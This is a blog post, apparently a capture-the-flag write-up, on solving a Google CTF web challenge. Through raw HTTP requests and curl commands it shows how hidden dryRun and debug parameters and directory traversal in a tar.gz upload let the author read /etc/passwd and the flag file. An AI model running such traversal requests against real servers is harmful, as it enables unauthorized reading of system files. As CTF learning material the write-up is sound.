---
layout: post
title:  "H4CK1NG G00GL3 - EP4C01"
subtitle: "Episode 004 - Challenge 01 - When Write becomes Read"
date:   2024-10-09 09:05:34 +0300
tags: [CTF, research, hacking-google, exploit, web]
readtime: true
cover-img: ["/assets/images/Hacking-Google/Hacking-Google-Cover.png"]
thumbnail-img: "/assets/images/Hacking-Google/Hacking-Google-Thumbnail.png"
share-img: "/assets/images/Hacking-Google/Hacking-Google-Ep04-C1-website.png"
---

Starting off episode 4, I learned from past mistakes and paid a bit more attention to the video. This time, it covers Google's bug bounty program - an effort to pay white-hat hackers to catch the vulnerabilities before the bad guys do.

In the episode's into, there's a hint I made sure to not miss:

> "Eduardo has the URL, but look through the frames to find the password."
> Hint: https://storage.googleapis.com/gctf-h4ck-2022-attachments-project/google.png

The video starts with a reference to Donald Knuth, a prominent figure in the area of theoretical computer science. Famously, when he pulished a book, he offered to pay a small amount of money to anyone who manages to find an issue that needs to be corrected. A nice analogy to the world of bug bounties.

We get to meet said Eduardo very early and he appears in multiple parts of the video. At 12:51, there's a clear shot of his shirt - `aHR0cHM6Ly9nb29nLmdsZS9uaWNlc2hpcnQ=` which is base64-decoded to `https://goog.gle/niceshirt`. 

The link is invalid, however the URL from the hint above is an image of a Google search for the domain `goog.gle` which gets corrected to `goo.gle` - the real Google link shortner.

Fixing the URL and browsing to `https://goo.gle/niceshirt`. I get redirected to `https://vrp-website-web.h4ck.ctfcompetition.com/`.

In the past, I [had the chance to submit a bug bountry to Google's VRP program](https://astrix.security/learn/blog/ghosttoken-exploiting-gcp-application-infrastructure-to-create-invisible-unremovable-trojan-app-on-google-accounts/), and this URL's website looks quite identical to the official one - only hosted on a different domain.

Going through the video, I searched for any frame containing a password, but I couldn't find anything.

Well, nothing to go on here. Let's see the first challenge.

The flavortext mentions an endpoint used by the VRP website (vulnerability reward program, Google's name for thier bug bounty), and the link opens the exact same endpoint that Eduardo's shirt contained. Odd.

The hint mentions that a good target to exploit is a special endpoint for importing attachments, and that there's some text within the website that mentions this endpoint.

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Hacking-Google/Hacking-Google-Ep04-C1-website.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>Website's welcome screen</i></figcaption>
</figure>

Compared to the original VRP website, most links lead you to the original website, do not work or are completely missing. There are only really three "real" ones - the *Overview* page, the *FAQs* page, and the *Learn* page. There's also a *Contributing* page that isn't clickable.

The *FAQs* page contains this interesting bit:

> To debug, you should call the [/import endpoint](https://path-less-traversed-web.h4ck.ctfcompetition.com/import) manually and look at the detailed error message in the response. The same applies to the [/export endpoint](https://path-less-traversed-web.h4ck.ctfcompetition.com/export) for downloading attachments from a submission. 

This is the import endpoint the hint mentioned, I guess. Let's try probing it:

```
GET https://path-less-traversed-web.h4ck.ctfcompetition.com/import HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com

HTTP/1.1 405 Method Not Allowed
Content-Type: text/plain; charset=utf-8
Content-Length: 18

only POST allowed
```

Alright website, as you wish
```
POST https://path-less-traversed-web.h4ck.ctfcompetition.com/import HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com
Content-Length: 0

HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Content-Length: 29

missing submission parameter
```

Sure.

```
POST https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=test HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com
Content-Length: 0

HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8
Content-Length: 93

server undergoing migration, import endpoint is temporarily disabled (dry run still enabled)
```

At this point, I guessed that the mention of a dry run could reference another parameter or a header. I tried passing a `dry_run` parameter equalling `1` or `true`, as well as a header `Dry-Run`, but got the same error message. 

Perhaps the `export` endpoint could reveal more things about the `import` one?

```
GET https://path-less-traversed-web.h4ck.ctfcompetition.com/export HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com
Content-Length: 0

HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Content-Length: 29

missing submission parameter
```

Ah, so it needs the same parameter.
```
GET https://path-less-traversed-web.h4ck.ctfcompetition.com/export?submission=test HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com
Content-Length: 0

HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Content-Length: 29

missing attachment parameter
```

So we have yet another parameter here,
```
GET https://path-less-traversed-web.h4ck.ctfcompetition.com/export?submission=sub&attachment=att HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com
Content-Length: 0

HTTP/1.1 402 Payment Required
Content-Type: text/plain; charset=utf-8
Content-Length: 72

submission /web-apps/go/sub does not exist (try our sample_submission?)
```

Pretty funny HTTP error code here. Anyway, some progress, finally! This leaks some information:

- The server is served from `/web-apps/go`
- The server is written in Go
- The export endpoint searches the `/web-apps/go/{submission}` directory according to the error code. It hints about a directory named `sample_submission`.

Let's try the suggested directory:

```
GET https://path-less-traversed-web.h4ck.ctfcompetition.com/export?submission=sample_submission&attachment=att HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com
Content-Length: 0

HTTP/1.1 402 Payment Required
Content-Type: text/plain; charset=utf-8
Content-Length: 73

attachment /web-apps/go/sample_submission/attachments/att does not exist
```

So if the directory exists, it builds the following path to a file: `/web-apps/go/{submission}/attachments/{attachment}`.

Since both of the parameters are used in the path, I tried using them to achieve some sort of LFI.

Testing directory traversal, placing null bytes, using multiple parameters of the same name, and other similar tricks did not work. Using the error message, it's quite clear to me that the server strips from both parameters what's after the last `"/"` character and uses this in the path construction. 

Given that conclusion, I tried to confuse the "splitter", but it was resilient to whatever I threw at it.

At this point, I was pretty stuck. I kept trying to bruteforce my way into the `import` endpoint, overcoming the parameter parser in the `export` endpoint, reviewed the entire website searching for hidden clues, and searching for said "password" within the frames of the video, but did not find anything.

Defeated, I decided to skip ahead to the next challenges. 

I solved the 2nd challenge, but it didn't provide any help with this one. During the solve, I exploited the login functionality to log into the admin user.

I moved on to the 3rd challenge. It began by hinting that I check the *Contributing* page that was disabled. After logging in as the admin user, though, it became clickable.

The *Contributing* page contains a Git link to a repository hosting the website's source code. In it, I found the code that handles the `export` and `import` endpoints!

The current challenge did not expect me to have access to the source code, and so I did not want to cheat but just give myself a small hint on how to continue.

So, I slowly scrolled down through the code without revealing the entire functionality. Almost at the beginning of the handler, I noticed this line:

```go
// Allow a dry run to test the endpoint.
dryRun := r.URL.Query().Get("dryRun") != ""
```

Welp, turns out I simply didn't try and bruteforce the all possible cases for the "dry run" parameter. Knowing this, I continued with the blackbox approach as if I didn't have the soure code:

```
POST https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=test&dryRun=1 HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com
Content-Length: 0

HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Content-Length: 74

could not open file <nil>: request Content-Type isn't multipart/form-data
```

Huh. A `Content-Type: multipart/form-data` header is usually used for uploading files, which fits the supposed use of this endpoint.

Usually, a `multipart/form-data` POST body looks like this:

```
--------------------------5545f607b2ba8d49
Content-Disposition: form-data; name="{parameter_name}"; filename="{file_name}"
Content-Type: text/plain

{file_content}
--------------------------5545f607b2ba8d49--
```

I tried sending some simple tests using random variable names, but got a `could not open file <nil>: http: no such file` error.

Hmmm...Thinking back what I know from the `export` endpoint, this server is supposed to handle bug report submission attachments. Here, I pass the `submission` parameter but do not reference the `attachment` parameter directly. So, I guess the form-data `{parameter_name}` and `file_name` are used for this.

I also know that a full path to an attachment looks something like `/web-apps/go/{submission}/attachments/{attachment}`, and that the directory `sample_submission` exists under `/web-apps/go`

I used this knowledge to fix all three parameters:

```
POST https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=sample_submission&dryRun=true HTTP/1.1
Host: path-less-traversed-web.h4ck.ctfcompetition.com
Content-Type: multipart/form-data; boundary=------------------------5545f607b2ba8d49
Content-Length: 197

--------------------------5545f607b2ba8d49
Content-Disposition: form-data; name="attachments"; filename="attachment"
Content-Type: text/plain

test
--------------------------5545f607b2ba8d49--


HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Content-Length: 57

could not open file attachment with gzip: unexpected EOF
```

Progress! Looks like the endpoint expects a gzip file. I'm not going to manually send gzip files, so let's move to curl.

```sh
tal@tal:~$ echo "test" > gzip_file && tar -czf gzip_file.tar.gz gzip_file
tal@tal:~$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=sample_submission&dryRun=true" -F "attachments=@gzip_file.tar.gz"
new file: sample_submission/gzip_file
```

Interesting - it seems that the file I uploaded ended up being written to `sample_submission/gzip_file`. Maybe this endpoint's code of constructing this path (as opposed to the `export` endpoint) is vulnerable to directory traversal?


```sh
tal@tal:~$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=../../&dryRun=true" -F "attachments=@gzip_file.tar.gz"
new file: ../../gzip_file
```

Promising! But what now? I'm not sure creation of new files is too powerful, but maybe I can force the server to overwrite existing files? This primitive might be powerful if I could override critical system files.

Without thiking too much, I tried overwriting `/etc/passwd`:

```sh
tal@tal:~$ echo "test" > passwd && tar -czf passwd.tar.gz passwd
tal@tal:~$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=../../etc&dryRun=true" -F "attachments=@passwd.tar.gz"
WARNING: file ../../etc/passwd already exists and would get overwritten (enable debug to see differences)
```

Oh. In hindsight it's good that I got a warning, as successfully overwriting could potentially break the server.

Anyway, I need to enable debug mode. Maybe it's a parameter like `dryRun`?

```sh
tal@tal:~$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=../../etc&dryRun=true&debug=true" -F "attachments=@passwd.tar.gz"
WARNING: file ../../etc/passwd already exists and would get overwritten (enable debug to see differences)
showing existing and new contents:
=====
< root:x:0:0:root:/root:/bin/ash
< bin:x:1:1:bin:/bin:/sbin/nologin
< daemon:x:2:2:daemon:/sbin:/sbin/nologin
< adm:x:3:4:adm:/var/adm:/sbin/nologin
< lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
< sync:x:5:0:sync:/sbin:/bin/sync
< shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
< halt:x:7:0:halt:/sbin:/sbin/halt
< mail:x:8:12:mail:/var/mail:/sbin/nologin
< news:x:9:13:news:/usr/lib/news:/sbin/nologin
< uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
< operator:x:11:0:operator:/root:/sbin/nologin
< man:x:13:15:man:/usr/man:/sbin/nologin
< postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
< cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
< ftp:x:21:21::/var/lib/ftp:/sbin/nologin
< sshd:x:22:22:sshd:/dev/null:/sbin/nologin
< at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
< squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
< xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
< games:x:35:35:games:/usr/games:/sbin/nologin
< cyrus:x:85:12::/usr/cyrus:/sbin/nologin
< vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
< ntp:x:123:123:NTP:/var/empty:/sbin/nologin
< smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
< guest:x:405:100:guest:/dev/null:/sbin/nologin
< nobody:x:65534:65534:nobody:/:/sbin/nologin
< svn:x:100:101:svn:/var/svn:/sbin/nologin
<
-----
> test
>
=====
```

Oh, alright. Enabling `debug` gives the same warning but also enables a feature of displaying a diff between the file that is going to be overwritten and the new one. So I actually have an aribtrary file reading capabilities.

Guessing that the flag is saved at `/flag` again, it should be easy to read:

```sh
tal@tal:~$ echo "test" > flag && tar -czf flag.tar.gz flag
tal@tal:~$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=../../&dryRun=true&debug=true" -F "attachments=@flag.tar.gz"

WARNING: file ../../flag already exists and would get overwritten (enable debug to see differences)
showing existing and new contents:

# ...
```

And the flag is in my hands :)